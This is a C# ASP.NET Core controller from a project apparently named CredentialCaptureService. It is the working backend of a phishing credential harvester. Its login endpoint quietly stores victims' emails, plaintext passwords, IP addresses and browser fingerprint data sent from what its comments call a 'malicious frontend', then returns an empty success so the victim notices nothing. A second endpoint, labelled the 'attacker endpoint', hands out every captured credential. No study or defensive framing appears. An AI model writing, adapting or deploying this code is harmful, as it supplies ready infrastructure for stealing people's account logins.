namespace CredentialCaptureService.Controllers;

using Microsoft.AspNetCore.Mvc;
using CredentialCaptureService.DTOs;
using CredentialCaptureService.Models;
using CredentialCaptureService.Services;

[ApiController]
[Route("api/auth")]
public class AuthController : ControllerBase
{
    private readonly ICredentialService _credentialService;
    private readonly ILogger<AuthController> _logger;

    public AuthController(ICredentialService credentialService, ILogger<AuthController> logger)
    {
        _credentialService = credentialService;
        _logger = logger;
    }

    /// <summary>
    /// Capture endpoint - Receives credentials from malicious frontend
    /// </summary>
    [HttpPost("login")]
    public async Task<IActionResult> Capture([FromBody] LoginRequest request)
    {
        try
        {
            // No validation - just capture whatever comes in
            var captured = new CapturedCredential
            {
                Email = request.Email,
                Password = request.Password,  // PLAINTEXT
                SourceIpAddress = HttpContext.Connection.RemoteIpAddress?.ToString(),
                UserAgent = request.UserAgent,
                Timezone = request.Timezone,
                ScreenResolution = request.ScreenResolution,
                Language = request.Language,
                Platform = request.Platform,
                CapturedAt = DateTime.UtcNow,
            };

            // Save to JSON file
            await _credentialService.SaveCredentialAsync(captured);

            _logger.LogWarning("CREDENTIAL CAPTURED - Email: {Email}, IP: {IP}", 
                request.Email, captured.SourceIpAddress);

            // Return 200 OK - empty response, no message
            return Ok();
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Error capturing credentials");
            return StatusCode(500);
        }
    }

    /// <summary>
    /// Attacker endpoint - retrieve all captured credentials
    /// </summary>
    [HttpGet("logs")]
    public async Task<IActionResult> GetLogs()
    {
        try
        {
            var credentials = await _credentialService.GetAllCredentialsAsync();
            
            return Ok(new
            {
                count = credentials.Count,
                credentials = credentials,
                exportedAt = DateTime.UtcNow,
            });
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Error retrieving logs");
            return StatusCode(500);
        }
    }

    /// <summary>
    /// Health check endpoint
    /// </summary>
    [HttpGet("health")]
    public IActionResult Health()
    {
        return Ok(new
        {
            status = "healthy",
            timestamp = DateTime.UtcNow,
        });
    }
}
